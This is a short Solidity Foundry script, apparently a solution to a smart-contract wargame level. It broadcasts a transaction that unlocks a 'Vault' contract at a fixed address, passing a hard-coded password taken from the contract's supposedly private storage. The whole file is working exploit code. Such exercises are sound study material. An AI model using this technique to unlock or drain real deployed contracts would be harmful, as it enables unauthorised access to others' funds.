//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "src/vault/Vault.sol";

contract VaultAttack is Script {

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address level = 0x5189F80a8501E1991943c9F2d2E4cedc1aEd22Fe;
        Vault vault = Vault(level);
        vault.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);

        vm.stopBroadcast();
    }
}

